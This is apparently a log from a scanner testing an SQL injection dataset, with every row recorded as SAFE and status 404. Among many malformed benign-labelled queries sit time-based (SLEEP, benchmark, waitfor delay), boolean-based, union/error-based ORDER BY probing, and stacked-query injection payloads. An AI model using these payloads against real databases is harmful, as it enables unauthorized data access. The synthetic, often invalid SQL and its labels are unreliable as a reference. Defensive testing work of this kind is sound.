SQL Injection Dataset Results
Start Time: 2026-04-05 15:32:05.442580

[1] SAFE | Status:404 | Time:0.008s | Payload: sql_query,injection_type,vulnerability_status,sql_command,target_table,selected_columns,comparison_operator,logical_operator,sql_comment_syntax
[882] SAFE | Status:404 | Time:0.008s | Payload: SELECT MAX(price) FROM admin WHERE order_id >= 'shipped' NOT order_id >= 'pending',None_Type,No,SELECT,admin,MAX(price),>=,NOT,
[883] SAFE | Status:404 | Time:0.005s | Payload: SELECT MAX(price) FROM employees WHERE id != 1 NOT ORDER BY 18-- --,Error-Based,Yes,SELECT,employees,MAX(price),!=,NOT,--
[884] SAFE | Status:404 | Time:0.006s | Payload: "EXEC('SELECT price, status FROM login WHERE id < 1 OR 1=1 AND (SELECT 1 FROM DUAL WHERE LENGTH((SELECT version()))>0)--') --",stackqueries_based,Yes,EXEC,login,"price, status",<,Embedded in Payload,--
[885] SAFE | Status:404 | Time:0.006s | Payload: SELECT MAX(price) FROM transactions WHERE user_id IN 'pending' NOT user_id IN 'safe',None_Type,No,SELECT,transactions,MAX(price),IN,NOT,
[886] SAFE | Status:404 | Time:0.005s | Payload: DELETE * FROM employees WHERE id >= 'active' AND id >= 'pending',None_Type,No,DELETE,employees,*,>=,AND,
[887] SAFE | Status:404 | Time:0.006s | Payload: CALL COUNT(*) FROM passwords WHERE user_id < 'test@example.com' OR user_id < 'shipped',None_Type,No,CALL,passwords,COUNT(*),<,OR,
[888] SAFE | Status:404 | Time:0.006s | Payload: EXEC * FROM sessions WHERE product_id < 'safe' NOT product_id < 1,None_Type,No,EXEC,sessions,*,<,NOT,
[889] SAFE | Status:404 | Time:0.006s | Payload: INSERT COUNT(*) FROM payments WHERE price != 'shipped' AND price != NULL,None_Type,No,INSERT,payments,COUNT(*),!=,AND,
[890] SAFE | Status:404 | Time:0.006s | Payload: "INSERT created_at, updated_at FROM sessions WHERE price BETWEEN 'active' AND price BETWEEN 'safe'",None_Type,No,INSERT,sessions,"created_at, updated_at",BETWEEN,AND,
[891] SAFE | Status:404 | Time:0.005s | Payload: "SELECT id, email FROM admin WHERE id > 1 ORDER BY 27#",Error-Based,Yes,SELECT,admin,"id, email",>,,
[892] SAFE | Status:404 | Time:0.007s | Payload: "SELECT price, status FROM admin WHERE price <= 1 AND price <= 'test@example.com'",None_Type,No,SELECT,admin,"price, status",<=,AND,
[893] SAFE | Status:404 | Time:0.006s | Payload: UPDATE * FROM credentials WHERE status <= NULL NOT status <= NULL,None_Type,No,UPDATE,credentials,*,<=,NOT,
[894] SAFE | Status:404 | Time:0.005s | Payload: SELECT * FROM passwords WHERE status != 'active' AND status != 'test@example.com',None_Type,No,SELECT,passwords,*,!=,AND,
[895] SAFE | Status:404 | Time:0.006s | Payload: CALL COUNT(*) FROM login WHERE created_at != '2024-01-01' AND created_at != '2024-01-01',None_Type,No,CALL,login,COUNT(*),!=,AND,
[896] SAFE | Status:404 | Time:0.006s | Payload: "UPDATE created_at, updated_at FROM accounts WHERE user_id IN 1 AND user_id IN 'active'",None_Type,No,UPDATE,accounts,"created_at, updated_at",IN,AND,
[897] SAFE | Status:404 | Time:0.009s | Payload: "DELETE FROM sessions WHERE id = 1 LIKE "" OR 1=1 LIMIT 0, 1 -- #",meta_based,Yes,DELETE,sessions,,=,LIKE,#
[898] SAFE | Status:404 | Time:0.009s | Payload: EXEC MAX(price) FROM users WHERE price != 'safe' NOT price != 'shipped',None_Type,No,EXEC,users,MAX(price),!=,NOT,
[899] SAFE | Status:404 | Time:0.01s | Payload: "DELETE id, email FROM login WHERE price > 'pending' NOT price > 'safe'",None_Type,No,DELETE,login,"id, email",>,NOT,
[900] SAFE | Status:404 | Time:0.007s | Payload: EXEC * FROM sessions WHERE product_id LIKE 'pending' AND product_id LIKE 'test@example.com',None_Type,No,EXEC,sessions,*,LIKE,AND,
[901] SAFE | Status:404 | Time:0.008s | Payload: "SELECT created_at, updated_at FROM transactions WHERE order_id = 'active' NOT order_id = 'safe'",None_Type,No,SELECT,transactions,"created_at, updated_at",=,NOT,
[902] SAFE | Status:404 | Time:0.008s | Payload: "DELETE price, status FROM sessions WHERE email IN 'test@example.com' AND email IN 1",None_Type,No,DELETE,sessions,"price, status",IN,AND,
[903] SAFE | Status:404 | Time:0.009s | Payload: SELECT COUNT(*) FROM payments WHERE id > 1 OR );waitfor delay '0:0:5'-- #,Time-Based,Yes,SELECT,payments,COUNT(*),>,OR,#
[904] SAFE | Status:404 | Time:0.012s | Payload: "INSERT price, status FROM payments WHERE email > '2024-01-01' AND email > 'active'",None_Type,No,INSERT,payments,"price, status",>,AND,
[905] SAFE | Status:404 | Time:0.01s | Payload: CALL COUNT(*) FROM credentials WHERE status != '2024-01-01' NOT status != NULL,None_Type,No,CALL,credentials,COUNT(*),!=,NOT,
[906] SAFE | Status:404 | Time:0.007s | Payload: "CALL user_id, product_id FROM accounts WHERE price BETWEEN 'safe' OR price BETWEEN 'safe'",None_Type,No,CALL,accounts,"user_id, product_id",BETWEEN,OR,
[907] SAFE | Status:404 | Time:0.007s | Payload: DELETE MIN(created_at) FROM login WHERE status <= 1 NOT status <= 1,None_Type,No,DELETE,login,MIN(created_at),<=,NOT,
[908] SAFE | Status:404 | Time:0.008s | Payload: DELETE COUNT(*) FROM sessions WHERE user_id < 'test@example.com' NOT user_id < 'shipped',None_Type,No,DELETE,sessions,COUNT(*),<,NOT,
[909] SAFE | Status:404 | Time:0.007s | Payload: CALL MAX(price) FROM employees WHERE updated_at = 'shipped' OR updated_at = 'shipped',None_Type,No,CALL,employees,MAX(price),=,OR,
[910] SAFE | Status:404 | Time:0.01s | Payload: DELETE * FROM passwords WHERE created_at LIKE 'pending' NOT created_at LIKE '2024-01-01',None_Type,No,DELETE,passwords,*,LIKE,NOT,
[911] SAFE | Status:404 | Time:0.005s | Payload: "EXEC id, email FROM employees WHERE product_id LIKE 'active' AND product_id LIKE 'safe'",None_Type,No,EXEC,employees,"id, email",LIKE,AND,
[912] SAFE | Status:404 | Time:0.007s | Payload: "UPDATE id, email FROM users WHERE id != 1 AND id != 'shipped'",None_Type,No,UPDATE,users,"id, email",!=,AND,
[913] SAFE | Status:404 | Time:0.008s | Payload: "SELECT price, status FROM payments WHERE price <= 'active' NOT price <= 1",None_Type,No,SELECT,payments,"price, status",<=,NOT,
[914] SAFE | Status:404 | Time:0.009s | Payload: "EXEC created_at, updated_at FROM users WHERE order_id = 'active' OR order_id = 'pending'",None_Type,No,EXEC,users,"created_at, updated_at",=,OR,
[915] SAFE | Status:404 | Time:0.009s | Payload: "SELECT user_id, product_id FROM transactions WHERE id != 1 ORDER BY SLEEP(5)--",Time-Based,Yes,SELECT,transactions,"user_id, product_id",!=,,
[916] SAFE | Status:404 | Time:0.011s | Payload: "SELECT user_id, product_id FROM payments WHERE id = 1 benchmark(50000000,MD5(1))--",Time-Based,Yes,SELECT,payments,"user_id, product_id",=,,
[917] SAFE | Status:404 | Time:0.008s | Payload: UPDATE MIN(created_at) FROM admin WHERE created_at IN 'test@example.com' NOT created_at IN NULL,None_Type,No,UPDATE,admin,MIN(created_at),IN,NOT,
[918] SAFE | Status:404 | Time:0.009s | Payload: "CALL created_at, updated_at FROM passwords WHERE product_id BETWEEN '2024-01-01' OR product_id BETWEEN 'shipped'",None_Type,No,CALL,passwords,"created_at, updated_at",BETWEEN,OR,
[919] SAFE | Status:404 | Time:0.011s | Payload: EXEC MAX(price) FROM users WHERE user_id != 'pending' OR user_id != 'shipped',None_Type,No,EXEC,users,MAX(price),!=,OR,
[920] SAFE | Status:404 | Time:0.006s | Payload: SELECT COUNT(*) FROM employees WHERE order_id <= 'safe' AND order_id <= 1,None_Type,No,SELECT,employees,COUNT(*),<=,AND,
[921] SAFE | Status:404 | Time:0.008s | Payload: DELETE FROM transactions WHERE id >= 1 OR ORDER BY 31337#,Error-Based,Yes,DELETE,transactions,*,>=,OR,
[922] SAFE | Status:404 | Time:0.005s | Payload: "EXEC price, status FROM passwords WHERE id BETWEEN 'pending' OR id BETWEEN '2024-01-01'",None_Type,No,EXEC,passwords,"price, status",BETWEEN,OR,
[923] SAFE | Status:404 | Time:0.009s | Payload: "EXEC('SELECT price, status FROM transactions WHERE id >= 1 OR 3409=3409 AND (ASCII(SUBSTRING('admin',1,1)) = 97)') --",boolean-based,Yes,EXEC,transactions,"price, status",>=,,--
[924] SAFE | Status:404 | Time:0.009s | Payload: UPDATE * FROM passwords WHERE price >= 'safe' OR price >= 'pending',None_Type,No,UPDATE,passwords,*,>=,OR,
[925] SAFE | Status:404 | Time:0.011s | Payload: SELECT COUNT(*) FROM transactions WHERE id = 'pending' OR id = 'pending',None_Type,No,SELECT,transactions,COUNT(*),=,OR,
[926] SAFE | Status:404 | Time:0.009s | Payload: "SELECT user_id, product_id FROM admin WHERE status LIKE NULL NOT status LIKE 'safe'",None_Type,No,SELECT,admin,"user_id, product_id",LIKE,NOT,
[927] SAFE | Status:404 | Time:0.009s | Payload: EXEC MAX(price) FROM passwords WHERE status <= 1 OR status <= 'test@example.com',None_Type,No,EXEC,passwords,MAX(price),<=,OR,
[928] SAFE | Status:404 | Time:0.01s | Payload: CALL passwords_procedure(ORDER BY 4) #,Union-Based,Yes,CALL,passwords,*,=,,#
[929] SAFE | Status:404 | Time:0.01s | Payload: DELETE FROM payments WHERE id > 1 NOT ORDER BY 10--,Error-Based,Yes,DELETE,payments,*,>,NOT,
[930] SAFE | Status:404 | Time:0.01s | Payload: "UPDATE created_at, updated_at FROM users WHERE updated_at < 'active' OR updated_at < 'pending'",None_Type,No,UPDATE,users,"created_at, updated_at",<,OR,
[931] SAFE | Status:404 | Time:0.011s | Payload: INSERT COUNT(*) FROM payments WHERE price != 'safe' NOT price != 'shipped',None_Type,No,INSERT,payments,COUNT(*),!=,NOT,
[932] SAFE | Status:404 | Time:0.012s | Payload: "EXEC user_id, product_id FROM passwords WHERE order_id <= 'shipped' NOT order_id <= 'safe'",None_Type,No,EXEC,passwords,"user_id, product_id",<=,NOT,
[933] SAFE | Status:404 | Time:0.011s | Payload: DELETE MAX(price) FROM users WHERE created_at >= 'test@example.com' AND created_at >= 'test@example.com',None_Type,No,DELETE,users,MAX(price),>=,AND,
[934] SAFE | Status:404 | Time:0.01s | Payload: "EXEC('SELECT user_id, product_id FROM admin WHERE id = 1 ORDER BY 25--')",Error-Based,Yes,EXEC,admin,"user_id, product_id",=,,
[935] SAFE | Status:404 | Time:0.012s | Payload: "CALL price, status FROM passwords WHERE updated_at != NULL AND updated_at != '2024-01-01'",None_Type,No,CALL,passwords,"price, status",!=,AND,
[936] SAFE | Status:404 | Time:0.009s | Payload: "UPDATE sessions SET name = 'admin' OR benchmark(10000000,MD5(1))# WHERE id = 1 #",Time-Based,Yes,UPDATE,sessions,*,=,OR,#
[937] SAFE | Status:404 | Time:0.008s | Payload: EXEC * FROM payments WHERE product_id LIKE 'pending' AND product_id LIKE 'pending',None_Type,No,EXEC,payments,*,LIKE,AND,
[938] SAFE | Status:404 | Time:0.007s | Payload: SELECT MAX(price) FROM sessions WHERE id = 1 OR 3409=3409 AND (1=0) AND (EXISTS (SELECT 1 FROM users WHERE username='admin') AND LENGTH('admin') = 5) --,boolean-based,Yes,SELECT,sessions,MAX(price),=,,--
[939] SAFE | Status:404 | Time:0.008s | Payload: INSERT MIN(created_at) FROM credentials WHERE email IN '2024-01-01' AND email IN 'safe',None_Type,No,INSERT,credentials,MIN(created_at),IN,AND,
[940] SAFE | Status:404 | Time:0.005s | Payload: "SELECT price, status FROM sessions WHERE id != 1 OR ORDER BY 15 #",Union-Based,Yes,SELECT,sessions,"price, status",!=,OR,#
[941] SAFE | Status:404 | Time:0.008s | Payload: "UPDATE id, email FROM admin WHERE id >= 'test@example.com' AND id >= NULL",None_Type,No,UPDATE,admin,"id, email",>=,AND,
[942] SAFE | Status:404 | Time:0.005s | Payload: "EXEC created_at, updated_at FROM employees WHERE price != 'safe' AND price != 'active'",None_Type,No,EXEC,employees,"created_at, updated_at",!=,AND,
[943] SAFE | Status:404 | Time:0.008s | Payload: "SELECT MIN(created_at) FROM sessions WHERE id >= 1 OR 3409=3409 AND (1=0) AND (ASCII(SUBSTRING('admin',1,1)) = 97) -- Check for 'a' --",boolean-based,Yes,SELECT,sessions,MIN(created_at),>=,,--
[944] SAFE | Status:404 | Time:0.007s | Payload: UPDATE users SET username = 'test' LIKE ORDER BY 16-- WHERE id >= 1 #,Union-Based,Yes,UPDATE,users,*,>=,LIKE,#
[945] SAFE | Status:404 | Time:0.007s | Payload: "SELECT user_id, product_id FROM credentials WHERE id > 1 NOT ORDER BY 3--",Error-Based,Yes,SELECT,credentials,"user_id, product_id",>,NOT,
[946] SAFE | Status:404 | Time:0.008s | Payload: SELECT * FROM credentials WHERE id != 1 LIKE &&SLEEP(5) #,Time-Based,Yes,SELECT,credentials,*,!=,LIKE,#
[947] SAFE | Status:404 | Time:0.007s | Payload: "SELECT id, email FROM sessions WHERE id <= 1 ORDER BY 18 --",Union-Based,Yes,SELECT,sessions,"id, email",<=,,--
[948] SAFE | Status:404 | Time:0.007s | Payload: EXEC('SELECT * FROM credentials WHERE id = 1 or SLEEP(5)=''),Time-Based,Yes,EXEC,credentials,*,=,,
[949] SAFE | Status:404 | Time:0.007s | Payload: "SELECT created_at, updated_at FROM admin WHERE id < 1 LIKE ORDER BY 26 --",Union-Based,Yes,SELECT,admin,"created_at, updated_at",<,LIKE,--
[950] SAFE | Status:404 | Time:0.008s | Payload: EXEC * FROM payments WHERE id IN 'shipped' OR id IN 'shipped',None_Type,No,EXEC,payments,*,IN,OR,
[951] SAFE | Status:404 | Time:0.006s | Payload: "CALL user_id, product_id FROM passwords WHERE created_at IN 'safe' OR created_at IN 'pending'",None_Type,No,CALL,passwords,"user_id, product_id",IN,OR,
[952] SAFE | Status:404 | Time:0.007s | Payload: SELECT COUNT(*) FROM login WHERE email = '2024-01-01' OR email = 'pending',None_Type,No,SELECT,login,COUNT(*),=,OR,
[953] SAFE | Status:404 | Time:0.006s | Payload: INSERT * FROM payments WHERE id LIKE 'safe' NOT id LIKE 'active',None_Type,No,INSERT,payments,*,LIKE,NOT,
[954] SAFE | Status:404 | Time:0.008s | Payload: DELETE FROM transactions WHERE id = 1 OR 1=1 AND EXISTS(SELECT * FROM information_schema.tables WHERE table_schema='mysql')-- --,stackqueries_based,Yes,DELETE,transactions,*,=,Embedded in Payload,--
[955] SAFE | Status:404 | Time:0.007s | Payload: SELECT COUNT(*) FROM users WHERE product_id >= 'test@example.com' AND product_id >= 'test@example.com',None_Type,No,SELECT,users,COUNT(*),>=,AND,
[956] SAFE | Status:404 | Time:0.009s | Payload: "UPDATE id, email FROM employees WHERE status LIKE NULL AND status LIKE 'safe'",None_Type,No,UPDATE,employees,"id, email",LIKE,AND,
[957] SAFE | Status:404 | Time:0.006s | Payload: "SELECT id, email FROM passwords WHERE id >= 1 LIKE pg_SLEEP(5) #",Time-Based,Yes,SELECT,passwords,"id, email",>=,LIKE,#
[958] SAFE | Status:404 | Time:0.007s | Payload: SELECT * FROM payments WHERE updated_at <= 'shipped' AND updated_at <= '2024-01-01',None_Type,No,SELECT,payments,*,<=,AND,
[959] SAFE | Status:404 | Time:0.007s | Payload: INSERT * FROM login WHERE id > 'safe' OR id > 'safe',None_Type,No,INSERT,login,*,>,OR,
[960] SAFE | Status:404 | Time:0.007s | Payload: INSERT COUNT(*) FROM users WHERE email < 1 AND email < 1,None_Type,No,INSERT,users,COUNT(*),<,AND,
[961] SAFE | Status:404 | Time:0.008s | Payload: EXEC MIN(created_at) FROM transactions WHERE created_at != 'pending' OR created_at != 'active',None_Type,No,EXEC,transactions,MIN(created_at),!=,OR,
[962] SAFE | Status:404 | Time:0.006s | Payload: "SELECT user_id, product_id FROM credentials WHERE created_at <= NULL AND created_at <= 'test@example.com'",None_Type,No,SELECT,credentials,"user_id, product_id",<=,AND,
[963] SAFE | Status:404 | Time:0.008s | Payload: UPDATE COUNT(*) FROM login WHERE email >= '2024-01-01' OR email >= 'pending',None_Type,No,UPDATE,login,COUNT(*),>=,OR,
[964] SAFE | Status:404 | Time:0.007s | Payload: CALL MIN(created_at) FROM accounts WHERE email != NULL NOT email != '2024-01-01',None_Type,No,CALL,accounts,MIN(created_at),!=,NOT,
[965] SAFE | Status:404 | Time:0.009s | Payload: "SELECT user_id, product_id FROM transactions WHERE id >= 1 NOT "" AND (SELECT user()) = 'root' -- #",meta_based,Yes,SELECT,transactions,"user_id, product_id",>=,NOT,#
[966] SAFE | Status:404 | Time:0.006s | Payload: "CALL user_id, product_id FROM login WHERE product_id LIKE 1 OR product_id LIKE NULL",None_Type,No,CALL,login,"user_id, product_id",LIKE,OR,
[967] SAFE | Status:404 | Time:0.007s | Payload: "DELETE user_id, product_id FROM credentials WHERE price > 'shipped' NOT price > 'active'",None_Type,No,DELETE,credentials,"user_id, product_id",>,NOT,
[968] SAFE | Status:404 | Time:0.005s | Payload: "EXEC created_at, updated_at FROM login WHERE price LIKE 'test@example.com' AND price LIKE 'pending'",None_Type,No,EXEC,login,"created_at, updated_at",LIKE,AND,
[969] SAFE | Status:404 | Time:0.005s | Payload: SELECT MAX(price) FROM login WHERE created_at <= '2024-01-01' NOT created_at <= 'pending',None_Type,No,SELECT,login,MAX(price),<=,NOT,
[970] SAFE | Status:404 | Time:0.007s | Payload: "EXEC price, status FROM passwords WHERE status LIKE '2024-01-01' NOT status LIKE 'safe'",None_Type,No,EXEC,passwords,"price, status",LIKE,NOT,
[971] SAFE | Status:404 | Time:0.006s | Payload: EXEC COUNT(*) FROM transactions WHERE updated_at >= 'pending' NOT updated_at >= NULL,None_Type,No,EXEC,transactions,COUNT(*),>=,NOT,
[972] SAFE | Status:404 | Time:0.006s | Payload: SELECT MAX(price) FROM payments WHERE order_id = NULL NOT order_id = 'safe',None_Type,No,SELECT,payments,MAX(price),=,NOT,
[973] SAFE | Status:404 | Time:0.006s | Payload: DELETE FROM accounts WHERE id <= 1 NOT AND (SELECT * FROM users WHERE username='admin') IS NOT NULL -- --,meta_based,Yes,DELETE,accounts,,<=,NOT,--
[974] SAFE | Status:404 | Time:0.008s | Payload: "CALL user_id, product_id FROM transactions WHERE status = 'safe' NOT status = 'safe'",None_Type,No,CALL,transactions,"user_id, product_id",=,NOT,
[975] SAFE | Status:404 | Time:0.006s | Payload: "DELETE created_at, updated_at FROM admin WHERE price IN 'safe' AND price IN 'shipped'",None_Type,No,DELETE,admin,"created_at, updated_at",IN,AND,
[976] SAFE | Status:404 | Time:0.006s | Payload: "DELETE user_id, product_id FROM passwords WHERE id >= NULL OR id >= 'test@example.com'",None_Type,No,DELETE,passwords,"user_id, product_id",>=,OR,
[977] SAFE | Status:404 | Time:0.006s | Payload: "INSERT created_at, updated_at FROM login WHERE status < 1 NOT status < '2024-01-01'",None_Type,No,INSERT,login,"created_at, updated_at",<,NOT,
[978] SAFE | Status:404 | Time:0.006s | Payload: "CALL id, email FROM users WHERE email < '2024-01-01' AND email < 1",None_Type,No,CALL,users,"id, email",<,AND,
[979] SAFE | Status:404 | Time:0.009s | Payload: DELETE MAX(price) FROM admin WHERE updated_at IN 'pending' OR updated_at IN 'test@example.com',None_Type,No,DELETE,admin,MAX(price),IN,OR,
[980] SAFE | Status:404 | Time:0.006s | Payload: DELETE * FROM users WHERE email = '2024-01-01' OR email = 1,None_Type,No,DELETE,users,*,=,OR,
[981] SAFE | Status:404 | Time:0.007s | Payload: "CALL price, status FROM admin WHERE price IN '2024-01-01' OR price IN NULL",None_Type,No,CALL,admin,"price, status",IN,OR,
[982] SAFE | Status:404 | Time:0.007s | Payload: "SELECT price, status FROM admin WHERE email <= 'shipped' NOT email <= 'pending'",None_Type,No,SELECT,admin,"price, status",<=,NOT,
[983] SAFE | Status:404 | Time:0.005s | Payload: "SELECT id, email FROM payments WHERE user_id IN NULL AND user_id IN 'pending'",None_Type,No,SELECT,payments,"id, email",IN,AND,
[984] SAFE | Status:404 | Time:0.006s | Payload: "SELECT id, email FROM passwords WHERE price != 'safe' NOT price != 'active'",None_Type,No,SELECT,passwords,"id, email",!=,NOT,
[985] SAFE | Status:404 | Time:0.005s | Payload: "CALL created_at, updated_at FROM users WHERE updated_at > '2024-01-01' AND updated_at > 'pending'",None_Type,No,CALL,users,"created_at, updated_at",>,AND,
[986] SAFE | Status:404 | Time:0.006s | Payload: "UPDATE created_at, updated_at FROM sessions WHERE order_id >= 'shipped' AND order_id >= 1",None_Type,No,UPDATE,sessions,"created_at, updated_at",>=,AND,
